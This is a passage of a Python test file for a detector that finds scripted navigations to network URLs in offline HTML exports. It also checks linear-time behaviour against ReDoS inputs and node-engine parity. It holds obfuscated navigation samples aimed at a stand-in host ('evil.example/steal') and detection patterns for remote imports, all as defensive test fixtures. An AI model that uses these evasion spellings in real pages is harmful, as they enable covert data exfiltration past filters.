            '\u2028location = "https://evil.example"',
            '\ufefflocation.href = "https://evil.example"',
            'window\n.\nlocation\n=\n"https://evil.example"',
            "top?.open ( 'https://evil.example' )",
            'const location = { href: "" }; window.location.href = "https://evil.example";',
            'var l = location; l.href = "https://evil.example";',
            'x = location = "https://evil.example"',
            'if (x) { location = "https://evil.example" }',
        ])
        corpus.extend(self._NAV_CORPUS_NAVIGATES)
        corpus.extend(self._NAV_CORPUS_BENIGN)
        return corpus

    def test_the_navigation_scan_matches_the_pattern_it_replaced(self):
        """The linear scan must recognize EXACTLY what the repeated-prefix pattern recognized.

        The rewrite that made this check linear (see `_offlineNavSinkIndex`) is only safe if it is
        semantics-preserving in BOTH directions: a shape it stopped matching is an egress channel
        that silently reopened, and a shape it started matching is a benign script the exporter now
        deletes and the validator now rejects. The corpora above cover the shapes somebody thought
        to write down; this crosses their fragments so the near-misses at the JOINS are covered too,
        and compares every verdict against the frozen pattern.
        """
        corpus = self._nav_cross_corpus()
        self.assertGreater(len(corpus), 5000,
                           "the crossed corpus collapsed to %d samples; the equivalence pin is "
                           "only as good as what it crosses" % len(corpus))
        for sample in corpus:
            for oracle, prefixed_only, which in (
                    (self._LEGACY_NAV_FULL, False, "every"),
                    (self._LEGACY_NAV_PREFIXED, True, "the prefixed")):
                self.assertEqual(
                    resources.offline_nav_sink_index(sample, prefixed_only) >= 0,
                    bool(oracle.search(sample)),
                    "the linear scan and the pattern it replaced disagree about %s sink in %r. A "
                    "shape the scan stopped matching is an egress channel that silently reopened; "
                    "one it started matching is a benign script the exporter now deletes."
                    % (which, sample))

        # The crossed corpus is where the near-misses at the JOINS live, so it is the corpus most
        # worth putting through the OTHER engine too: the curated lists above are small enough that
        # a plausible drift in the hand-written walk (testing the boundary only at the longest chain,
        # say) passes every one of them and still breaks 129 crossed cases.
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine equivalence check needs it")
        script = (
            self._runtime_nav_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "process.stdout.write(JSON.stringify(p.map(s=>["
            "_offlineNavSinkIndex(s,false)>=0,_offlineNavSinkIndex(s,true)>=0])));});"
        )
        verdicts = self._run_nav_node(node, script, corpus, "the crossed navigation corpus")
        self.assertEqual(len(verdicts), len(corpus),
                         "node returned %d verdicts for %d crossed samples"
                         % (len(verdicts), len(corpus)))
        for sample, (js_full, js_prefixed) in zip(corpus, verdicts):
            self.assertEqual(
                js_full, bool(self._LEGACY_NAV_FULL.search(sample)),
                "the REAL JS engine and the pattern the scan replaced disagree about every sink "
                "in %r" % sample)
            self.assertEqual(
                js_prefixed, bool(self._LEGACY_NAV_PREFIXED.search(sample)),
                "the REAL JS engine and the pattern the scan replaced disagree about the prefixed "
                "sink in %r" % sample)

    # The URL literals from the navigating corpus whose danger is a LANGUAGE claim rather than a
    # regex one, paired with the value the JavaScript parser actually produces. Each is the URL
    # LITERAL only (the sink around it is what the corpus above covers).
    _NAV_LITERAL_VALUES = [
        ('" https://evil.example/steal"', " https://evil.example/steal"),
        ('"ht\ttps://evil.example"', "ht\ttps://evil.example"),
        ('"\\\nhttps://evil.example/steal"', "https://evil.example/steal"),
        ('"ht\\\rtps://evil.example"', "https://evil.example"),
        ('`\\\u2028https:evil.example`', "https:evil.example"),
        ('"/\\\n/evil.example"', "//evil.example"),
        (r'"\\\\evil.example"', "\\\\evil.example"),
        (r'"\//evil.example"', "//evil.example"),
        (r'"\\\evil.example"', "\\evil.example"),
        (r'"\https://evil.example/steal"', "https://evil.example/steal"),
        (r'"htt\ps://evil.example"', "https://evil.example"),
        (r'"https\://evil.example"', "https://evil.example"),
        (r'"\ https://evil.example"', " https://evil.example"),
        (r'"\htt\ps\://evil.example"', "https://evil.example"),
        (r'"\\https://evil.example"', "\\https://evil.example"),
    ]

    def test_the_line_continuation_samples_really_are_the_urls_they_claim(self):
        """Pin the JavaScript-LANGUAGE claim the widening rests on, not just the regex.

        The tail now accepts a LineContinuation (a backslash followed by a line terminator) because
        it evaluates to NOTHING, so `"\\<LF>https://evil"` IS the bare URL - and it accepts an
        escaped slash and a doubled backslash because of how many source backslashes a string
        literal spends per runtime one. Every one of those is a claim about the JS PARSER, and the
        parity tests above only ever hand the engine a pre-built STRING, so a wrong claim would
        sail through them: the corpus would still be "matched", it just would not be a beacon.
        Evaluate the literals in node and compare against what each is asserted to mean.
        """
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-parser check needs it")
        payload = [src for src, _ in self._NAV_LITERAL_VALUES]
        script = (
            "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const lits=JSON.parse(raw);"
            "const out=lits.map(s=>{try{return {ok:true,v:(0,eval)('('+s+')')};}"
            "catch(e){return {ok:false,v:String(e&&e.message)};}});"
            "process.stdout.write(JSON.stringify(out));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the URL literals: %s" % proc.stderr)
        got = json.loads(proc.stdout)
        self.assertEqual(len(got), len(self._NAV_LITERAL_VALUES),
                         "node returned %d values for %d literals"
                         % (len(got), len(self._NAV_LITERAL_VALUES)))
        for (src, expected), result in zip(self._NAV_LITERAL_VALUES, got):
            self.assertTrue(result["ok"],
                            "the JS parser rejects %r, so the corpus sample built from it is dead "
                            "source and proves nothing: %s" % (src, result["v"]))
            self.assertEqual(
                result["v"], expected,
                "the JS parser turns %r into %r, not the %r this change assumes - the sample is "
                "not the beacon (or the benign value) it is filed as"
                % (src, result["v"], expected))

    def _assert_reaches_local_binding_pass(self, evil, label):
        """The local-binding adversary must still ROUTE THROUGH the regex it is aimed at.

        `offline_script_navigates_to_network` answers and returns BEFORE that regex when no sink is
        found, so an unrelated change to SINK detection would leave this guard fast, green and
        guarding nothing. Assert the two conditions that put the expensive pass on the path.
        """
        self.assertGreaterEqual(
            resources.offline_nav_sink_index(evil, False), 0,
            "the %s adversary no longer trips the sink search, so the predicate answers before it "
            "reaches the local-binding regex and the budget below times nothing" % label)
        self.assertTrue(
            resources.OFFLINE_LOCAL_LOCATION_RE.search(evil),
            "the %s adversary no longer matches the local-binding regex, so it stops covering the "
            "pass it exists to time" % label)

    def test_the_navigation_pattern_cannot_be_made_to_backtrack(self):
        """The scan must stay linear on adversarial input, in BOTH engines.

        It runs over every executable inline script of an offline document - which can include a
        multi-megabyte inlined mermaid bundle - on every `validate.py --strict`, and the exporter
        runs it on every export. Its prefix chain once joined two unbounded whitespace runs around
        an optional `?` (`WS*\\??WS*\\.`), so a whitespace run never followed by a dot made the
        engine try every split: a 20k-space input took ~2.7s in Python and ~10s in node, which is a
        denial of service on an attacker-authored document (and an accidental hang on a minified
        one). Each optional part is bound inside its own group now, so each position consumes the
        run one way. A second shape amplified the same way: several almost-matching sink segments
        whose tail never reaches a URL (`window<sp>.<sp>top<sp>.<sp>location<sp>.<sp>href<sp>=<sp>'x'`)
        took 18s in node at 200 spaces per gap. Both are checked here;
        `test_the_navigation_scan_stays_linear_as_the_near_match_grows` pins the SCALING that a
        single fixed-size input cannot see.
        """
        local_binding_evil = _NAV_LOCAL_BINDING_EVIL % (" " * 30000)
        evils = [
            "window" + " " * 20000 + "X",
            ("window{0}.{0}top{0}.{0}location{0}.{0}href{0}={0}'not-a-url'").format(" " * 400),
            "window . " * 200 + "x",
            # The URL literal now also accepts a SCHEME-ONLY spelling, so pin the near-miss that
            # arms that alternation at every sink and never completes it.
            'location.href = "https' * 2000,
            # It also tolerates the padding a browser strips and a scheme split by an ASCII tab,
            # which reintroduces unbounded runs exactly where the earlier ReDoS lived.
            'location.href = "' + " " * 20000,
            'location.href = "h' + "\t" * 20000,
            # A LineContinuation run is an alternation next to the padding run, the shape that
            # would reintroduce two ways to consume the same input if it were spelled loosely.
            'location.href = "' + "\\\n" * 10000,
            'location.href = "h' + "\\\r" * 10000,
            'window.location.href = "' + "\\\n" * 10000,
            ('location.href = "' + " " * 200) * 200,
            # The PREFIXED sinks carry the same widened tail, so arm them through a prefixed sink
            # too rather than trusting the shared tail text alone.
            'window.location.href = "' + " " * 20000,
            # The shape reported in #973: an almost-matching prefix chain that alternates TWO
            # global names across wide gaps and never reaches a sink at all. The anchored scan
            # answers it without a chain walk, but the corpus only ever carried a single-name,
            # single-space chain, so pin the reported spelling itself.
            ("window{0}.{0}top{0}.{0}").format(" " * 8) * 2000,
            # The LOCAL-BINDING regex is the other half of the predicate and runs over the WHOLE
            # script whenever a sink is found, so it needs its own adversary. Its `function`
            # alternative joined two unbounded whitespace runs around an OPTIONAL identifier
            # (`function WS* IDENT{0,100} WS* \(`), which is the `WS*\??WS*\.` shape again: a run
            # never followed by `(` was split every possible way and each split re-ran the
            # `[^)]{0,400}location` search. The trailing sink plus `const location` is what makes
            # the predicate reach that regex and still answer False.
            local_binding_evil,
        ]
        self._assert_reaches_local_binding_pass(local_binding_evil, "fixed-size local-binding")
        # Both patterns are fuzzed: they share the tail byte for byte, but only one of them was
        # ever driven with adversarial input, so a divergence in the prefixed copy could hide here.
        for evil in evils:
            start = time.monotonic()
            self.assertFalse(resources.offline_script_navigates_to_network(evil))
            elapsed = time.monotonic() - start
            self.assertLess(
                elapsed, 1.0,
                "the navigation scan took %.2fs on a %d-character adversarial input - it is "
                "backtracking. Look for two unbounded repetitions that can consume the same input "
                "(the historical shape was `WS*\\??WS*\\.`); bind the optional part in its own "
                "group." % (elapsed, len(evil)))
        node = shutil.which("node")
        if not node:
            return
        script = (
            self._runtime_nav_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "const out=p.evils.map(e=>{const t=Date.now();"
            "const hit=_offlineScriptNavigatesToNetwork(e);"
            "return {ms:Date.now()-t,hit:hit};});"
            "process.stdout.write(JSON.stringify(out));});"
        )
        results = self._run_nav_node(node, script, {"evils": evils},
                                     "the adversarial navigation inputs")
        self.assertEqual(len(results), len(evils))
        for evil, result in zip(evils, results):
            self.assertFalse(result["hit"])
            self.assertLess(result["ms"], 1000,
                            "the REAL JS engine took %dms on a %d-character adversarial input - "
                            "the exporter would hang the reviewer's browser tab on an "
                            "attacker-authored document" % (result["ms"], len(evil)))

    # Two near-match SHAPES, each at 10x steps, because they stress opposite halves of the scan.
    # `head + unit * n + tail` must never match, so the whole input is walked before the verdict.
    #  - the anchorless near-match arms the prefix chain and never reaches a sink at all: this is
    #    the shape the quadratic pattern died on, and 18 KB is the size it took 2.3s on, so the
    #    smallest step alone reds a regression in seconds rather than after the largest one has run
    #    for an hour;
    #  - the prefix chain puts ONE anchor behind n prefixes, so the cost is the BACKWARDS walk
    #    rather than the anchor pass. It really does touch every character, hence the smaller steps;
    #  - the statement-position near-sink repeats an ASSIGN-tail sink behind a long whitespace run
    #    that an `X` stops from ever qualifying, which is the only path the first two do not walk.
    #    Its steps are smaller again because Python pays a regex call per whitespace character here
    #    (1.3s on 1.7 MB, against 0.2s in node) - linear, but with the largest constant of the three.
    # The last field says whether the shape must be checked for still ROUTING through the
    # local-binding pass; it lives in the tuple rather than in a label comparison so renaming a
    # shape cannot silently drop the check.
    _NAV_SCALING_SHAPES = (
        ("anchorless near-match", "", "window . ", "x", (2000, 20000, 200000), False),
        ("prefix chain", "$", "frames.", 'location.href="https:"', (500, 5000, 50000), False),
        ("statement-position near-sink", "", "X" + " " * 500 + 'location = "//e"; ', "",
         (3, 30, 300), False),
        # The three above grow the SINK search. This one grows the LOCAL-BINDING search, the other
        # full-text pass the predicate makes, and it grows the whitespace RUN rather than a repeat
        # count because that is where its quadratic term lived: cost was one re-search of the
        # `[^)]{0,400}` window per split of the run, so n repeats of a fixed gap stayed linear and
        # hid it.
        ("local-binding whitespace run", _NAV_LOCAL_BINDING_EVIL.split("%s", 1)[0], " ",
         _NAV_LOCAL_BINDING_EVIL.split("%s", 1)[1], (500, 5000, 50000), True),
    )
    _NAV_SCALING_BUDGET = 1.0

    def test_the_navigation_scan_stays_linear_as_the_near_match_grows(self):
        """A 10x longer near-match must not cost ~100x, in BOTH engines.

        The predicate was hardened against catastrophic BACKTRACKING once already, and the test
        above pins that. It was still QUADRATIC on a long NEAR-match, because the prefix chain was
        an unbounded repetition in front of the sink and the engine re-entered it at every position
        a prefix could follow: `"window . " * n` measured 2.3s at 18 KB, 9.4s at 36 KB, 36s at
        72 KB and 174s at 144 KB here - 4x the time for 2x the input. The existing guard used ~200
        repetitions, far below where that is visible, which is why a fixed-size input is not enough
        and this test measures the SCALING.

        It is cheap to trigger from a document: `_stripOfflineNetworkLoads` runs the predicate over
        every runnable script, and `_offlineLibBytesUnsafe` runs it over the vendored payload's
        INFLATED bytes, so a few hundred base64 bytes buy megabytes of near-match. The export runs
        in the reviewer's own browser, so the damage is an Export Offline that appears to hang - but
        an export that appears to hang is indistinguishable from a broken feature.
        """
        node = shutil.which("node")
        for label, head, unit, tail, steps, checks_binding_pass in self._NAV_SCALING_SHAPES:
            elapsed = []
            for n in steps:
                evil = head + unit * n + tail
                if checks_binding_pass:
                    self._assert_reaches_local_binding_pass(evil, label)
                start = time.monotonic()
                self.assertFalse(resources.offline_script_navigates_to_network(evil),
                                 "the %s sample must NOT match, or the scan stops early and times "
                                 "nothing" % label)
                took = time.monotonic() - start
                elapsed.append(took)
                self.assertLess(
                    took, self._NAV_SCALING_BUDGET,
                    "the navigation scan took %.2fs on a %d-character %s. It is meant to cost one "
                    "pass over the input; a quadratic term is back." % (took, len(evil), label))
            # The absolute budgets above cannot be met by a quadratic implementation at the largest
            # step, but state the SCALING directly as well: 10x the input, at most 30x the time
            # (with a floor, because the fastest step is too quick to time reliably).
            self.assertLess(
                elapsed[-1], max(0.5, elapsed[-2] * 30),
                "the navigation scan took %.3fs on a %d-character %s and %.3fs on one 10x longer - "
                "that is superlinear growth, so the cost is quadratic again"
                % (elapsed[-2], len(head + unit * steps[-2] + tail), label, elapsed[-1]))

            if not node:
                continue
            script = (
                self._runtime_nav_source() + "\n"
                + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
                "const p=JSON.parse(raw);"
                "process.stdout.write(JSON.stringify(p.steps.map(n=>{"
                "const evil=p.head+p.unit.repeat(n)+p.tail;const t=Date.now();"
                "const hit=_offlineScriptNavigatesToNetwork(evil);"
                "return {ms:Date.now()-t,hit:hit,len:evil.length};})));});"
            )
            payload = {"steps": list(steps), "head": head, "unit": unit, "tail": tail}
            results = self._run_nav_node(node, script, payload, "the %s timings" % label)
            self.assertEqual(len(results), len(steps),
                             "node returned %d timings for %d steps" % (len(results), len(steps)))
            for result in results:
                self.assertFalse(result["hit"])
                self.assertLess(
                    result["ms"], int(self._NAV_SCALING_BUDGET * 1000),
                    "the REAL JS engine took %dms on a %d-character %s - the exporter would hang "
                    "the reviewer's browser tab on a document that plants one, and the vendored "
                    "payload makes planting one cost a few hundred bytes"
                    % (result["ms"], result["len"], label))
            self.assertLess(
                results[-1]["ms"], max(500, results[-2]["ms"] * 30),
                "the REAL JS engine took %dms on a %d-character %s and %dms on one 10x longer - "
                "that is superlinear growth"
                % (results[-2]["ms"], results[-2]["len"], label, results[-1]["ms"]))

    def test_the_layer_script_survives_its_own_offline_strips(self):
        """The review layer's own script is stripped by the same pass as any other inline script.

        It carries no id the strip skips and is not exempt, so the moment the layer's SOURCE (code
        or a code COMMENT) contains one of the shapes the strip looks for, the exporter deletes the
        runtime from every offline file it writes. That is not hypothetical: a comment added while
        building this very check spelled out both an `import` call and a navigation to a URL
        literal, and every offline export silently came out with an empty JS region. Pin it here,
        where the message names the cause, instead of leaving a whole browser suite to fail with
        "JS region has no closing script tag".
        """
        js_dir = os.path.join(_paths.DEV, "assets", "js")
        sources = {
            "the layer source partials (assets/js/*.js)":
                "\n".join(self._read(name) for name in sorted(os.listdir(js_dir))
                          if name.endswith(".js")),
        }
        # Also check the BUILT layer, not only the concatenated partials: the build could add a
        # prologue or reorder, and it is the built bytes that actually ship inside every export.
        # Required, not best-effort - making it conditional would let the only shipped-bytes check
        # silently vanish in exactly the environment where the build is broken.
        built = os.path.join(_paths.DEV, "skill", "dist", "commentable-html.js")
        self.assertTrue(os.path.exists(built),
                        "the built layer is missing at %s - run `python scripts/rebuild_all.py`; "
                        "this guard must check the bytes that actually ship, not only the source "
                        "partials" % built)
        with open(built, "r", encoding="utf-8", newline="") as fh:
            sources["the BUILT layer (skill/dist/commentable-html.js)"] = fh.read()
        # A sufficient condition, mirroring `_offlineScriptHasNetworkEgress`: the layer is full of
        # https literals (its own site and repo links), so its safety rests entirely on containing
        # no dynamic-import call and no navigation to a URL literal.
        forbidden = [
            (re.compile(r"\bimport\s*\("),
             "a dynamic import call (the strip's second import term pairs it with any quoted "
             "network URL literal, and the layer has several)"),
            (re.compile(r"\bfrom\s+[\"'](?:https?:)?//", re.IGNORECASE), "a remote `from` import"),
            (re.compile(r"\bimport\s+[\"'](?:https?:)?//", re.IGNORECASE), "a bare remote import"),
        ]
        for label, body in sources.items():
            for rx, what in forbidden:
                hit = rx.search(body)
                self.assertIsNone(
                    hit, "%s now contains %s (near %r). The offline export strips its OWN script "
                         "with that test, so every offline file would ship without the runtime. "
                         "Reword the comment, or restructure the code." % (
                             label, what,
                             body[max(0, (hit.start() if hit else 0) - 60):
                                  (hit.end() if hit else 0) + 60]))
            # The navigation half is a SCAN rather than a pattern, so it reports an index.
            at = resources.offline_nav_sink_index(body, False)
            self.assertEqual(
                at, -1, "%s now contains a scripted navigation to a network URL (near %r). The "
                        "offline export strips its OWN script with that test, so every offline "
                        "file would ship without the runtime. Reword the comment, or restructure "
                        "the code." % (label, body[max(0, at - 60):at + 60]))

    def test_the_vendored_bundles_pass_the_offline_capture_gates(self):
        """Both paths that inline a library run its bytes through the same content gates, so the
        VENDORED bytes must satisfy them.

        This started as the re-export CAPTURE gate, but the PAYLOAD path now shares the predicate
        (`_offlineLibBytesUnsafe`), so these bytes face the gates on the ORDINARY export too, not
        only on a re-export. Both gates are cheap today only because the bundles happen to be clean.
        That is a property of the vendored files, not of the code, so a routine `mermaid` /
        `Chart.js` upgrade could silently make a legitimate export fail - and, because the refusal
        is deliberately fail-closed with no fallback, it would fail for every already-finalized
        document in the wild, not just here. Pin it where a dependency bump trips it, rather than in
        a browser test nobody connects to the upgrade.
        """
        source = self._read("68-export-offline.js")
        start = source.find("function _offlineScriptHasNetworkImport")
        self.assertNotEqual(start, -1, "the runtime no longer defines _offlineScriptHasNetworkImport")
        body = source[start:source.find("\n}", start)]
        patterns = re.findall(r"/((?:[^/\\\n]|\\.)+)/i?\.test\(src\)", body)
        self.assertEqual(
            len(patterns), 5,
            "_offlineScriptHasNetworkImport no longer has exactly 5 regex terms (found %d). The "
            "sufficient condition asserted below was derived from those terms; re-derive it."
            % len(patterns))

        # Assert a SUFFICIENT condition rather than re-evaluating the predicate: every one of its
        # terms requires a dynamic `import(` or a remote `from`/`import` string literal, so a bundle
        # with none of those cannot match any term. (Checking the terms individually would be
        # wrong - one of them is a conjunction, and its URL-literal half matches an innocuous
        # xlink namespace string inside mermaid.) The gate is now import OR NAVIGATION
        # (`_offlineScriptHasNetworkEgress`), so the navigation pattern is evaluated directly here
        # too: a bundle that ever tripped it would make a legitimate re-export fail loudly AND make
        # `validate.py --strict` reject the very file the exporter produced (the strict check scans
        # every executable inline script, and the library is appended after the strips run).
        blockers = [
            re.compile(r"\bimport\s*\("),
            re.compile(r"\bfrom\s+[\"'](?:https?:)?//", re.IGNORECASE),
            re.compile(r"\bimport\s+[\"'](?:https?:)?//", re.IGNORECASE),
        ]
        vendor = os.path.join(_paths.DEV, "assets", "vendor")
        for name in ("mermaid.min.js", "chart.umd.min.js"):
            path = os.path.join(vendor, name)
            self.assertTrue(os.path.exists(path), "missing vendored bundle %s" % path)
            with open(path, "r", encoding="utf-8", newline="") as fh:
                code = fh.read()
            for rx in blockers:
                self.assertIsNone(
                    rx.search(code),
                    "%s now contains %r, so it can trip the offline network-egress check and BOTH "
                    "inline paths would REJECT the genuine library - every export of a document "
                    "needing it would fail loudly. Re-check the bundle, or narrow that check."
                    % (name, rx.pattern))
            self.assertEqual(
                resources.offline_nav_sink_index(code, False), -1,
                "%s now scripts a navigation to a network URL literal, so it can trip the offline "
                "network-egress check and BOTH inline paths would REJECT the genuine library - "
                "every export of a document needing it would fail loudly. Re-check the bundle, or "
                "narrow that check." % name)
            # An end tag (or a start tag) would trip the script-data escape gate in the emitted
            # element; a bare `<!--` is harmless on its own, and mermaid legitimately contains one.
            self.assertIsNone(
                re.search(r"<\/?script|<\/style", code, re.IGNORECASE),
                "%s now contains a script-data escape sequence, so both offline inline paths "
                "would reject the genuine library." % name)


if __name__ == "__main__":
    unittest.main()
